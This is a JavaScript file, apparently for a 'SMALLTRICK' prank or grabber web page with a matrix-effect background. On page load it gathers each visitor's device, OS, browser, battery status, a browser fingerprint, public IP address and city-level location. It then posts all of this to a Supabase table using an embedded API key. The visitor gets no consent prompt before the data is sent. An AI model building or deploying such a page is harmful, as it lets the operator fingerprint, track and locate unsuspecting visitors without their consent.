// ============================================================
// 🔥 SMALLTRICK — Konfigurasi
// ============================================================
const SUPABASE_URL = 'https://fjjdbvyqqpshaxgqavnx.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_FGhSQDZF4jZGniE1F3RPrA_3i57aI4p';

// ============================================================
// MATRIX BACKGROUND (Canvas)
// ============================================================
(function matrixEffect() {
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&';
    const fontSize = 12;
    const columns = Math.ceil(canvas.width / fontSize);
    const drops = Array(columns).fill(0);

    function drawMatrix() {
        ctx.fillStyle = 'rgba(10, 10, 15, 0.04)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        ctx.fillStyle = '#00ff41';
        ctx.font = fontSize + 'px monospace';

        for (let i = 0; i < drops.length; i++) {
            const char = chars[Math.floor(Math.random() * chars.length)];
            const x = i * fontSize;
            const y = drops[i] * fontSize;

            ctx.fillStyle = '#00ff4188';
            ctx.fillText(char, x, y);

            if (y > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }

    setInterval(drawMatrix, 60);
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
})();

// ============================================================
// 1. TAMPILKAN GAMBAR RANDOM
// ============================================================
async function showRandomImage() {
    const img = document.getElementById('random-image');
    try {
        const res = await fetch('https://picsum.photos/400/300?random=' + Date.now());
        img.src = res.url;
    } catch (e) {
        img.alt = '[ ERROR ]';
    }
}

// ============================================================
// 2. DETEKSI DEVICE & FINGERPRINT
// ============================================================
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Unknown',
        os = 'Unknown',
        browser = 'Unknown';

    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
        device = /iPhone|iPad/i.test(ua) ? '📱 Apple Mobile' : '📱 Android Mobile';
    } else {
        device = '💻 Desktop/Laptop';
    }

    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac OS')) os = 'macOS';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS')) os = 'iOS';
    else if (ua.includes('Linux')) os = 'Linux';

    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Edg')) browser = 'Edge';
    else if (ua.includes('Opera')) browser = 'Opera';
    else browser = 'Other';

    return { device, os, browser };
}

function getFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.language,
        navigator.platform,
        window.screen.width,
        window.screen.height,
        window.screen.colorDepth,
        navigator.hardwareConcurrency || '',
        navigator.deviceMemory || ''
    ];
    let hash = 0;
    const str = components.join('||');
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return '0x' + Math.abs(hash).toString(16).padStart(8, '0');
}

// ============================================================
// 3. AMBIL BATTERY + IP
// ============================================================
async function getBatteryInfo() {
    if (!('getBattery' in navigator)) {
        return { level: '[ UNSUPPORTED ]', charging: '[ UNKNOWN ]' };
    }
    try {
        const battery = await navigator.getBattery();
        return {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? '⚡ CHARGING' : '🔋 DISCHARGING'
        };
    } catch (e) {
        return { level: '[ ERROR ]', charging: '[ ERROR ]' };
    }
}

async function getIPAndLocation() {
    try {
        const resIP = await fetch('https://api.ipify.org?format=json');
        const dataIP = await resIP.json();
        const ip = dataIP.ip;
        const resLoc = await fetch(`https://ipapi.co/${ip}/json/`);
        const dataLoc = await resLoc.json();
        let location = '[ UNKNOWN ]';
        if (dataLoc.city && dataLoc.country_name) {
            location = `${dataLoc.city}, ${dataLoc.country_name}`;
        } else if (dataLoc.country_name) {
            location = dataLoc.country_name;
        }
        return { ip, location };
    } catch (e) {
        return { ip: '[ UNKNOWN ]', location: '[ UNKNOWN ]' };
    }
}

// ============================================================
// 4. KUMPULKAN & KIRIM
// ============================================================
async function collectAndSendData() {
    const statusEl = document.getElementById('status');
    statusEl.textContent = '⏳ collecting data...';

    const device = getDeviceInfo();
    const battery = await getBatteryInfo();
    const ipData = await getIPAndLocation();
    const fingerprint = getFingerprint();

    setTimeout(() => {
        document.getElementById('device-info').textContent = device.device + ' (' + device.os + ')';
        document.getElementById('battery-info').textContent = battery.level + ' — ' + battery.charging;
        document.getElementById('ip-info').textContent = ipData.ip + ' → ' + ipData.location;
        document.getElementById('system-info').textContent = device.browser;
        document.getElementById('fingerprint-info').textContent = fingerprint;
        document.getElementById('data-container').classList.remove('hidden');
    }, 2500);

    const payload = {
        device_type: device.device,
        os_name: device.os,
        browser_name: device.browser,
        battery_level: battery.level,
        battery_charging: battery.charging,
        ip_address: ipData.ip,
        location: ipData.location,
        fingerprint: fingerprint,
        timestamp: new Date().toISOString()
    };

    try {
        const res = await fetch(`${SUPABASE_URL}/rest/v1/battery_data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'apikey': SUPABASE_ANON_KEY,
                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
            },
            body: JSON.stringify(payload)
        });

        if (res.ok) {
            statusEl.textContent = '✅ data transmitted successfully';
            statusEl.style.color = '#00ff41';
        } else {
            statusEl.textContent = '⚠️ transmission failed (status: ' + res.status + ')';
            statusEl.style.color = '#ff4444';
        }
    } catch (e) {
        statusEl.textContent = '❌ error: ' + e.message;
        statusEl.style.color = '#ff4444';
    }
}

// ============================================================
// 5. INIT
// ============================================================
async function init() {
    await showRandomImage();
    setTimeout(collectAndSendData, 1200);
}

document.addEventListener('DOMContentLoaded', init);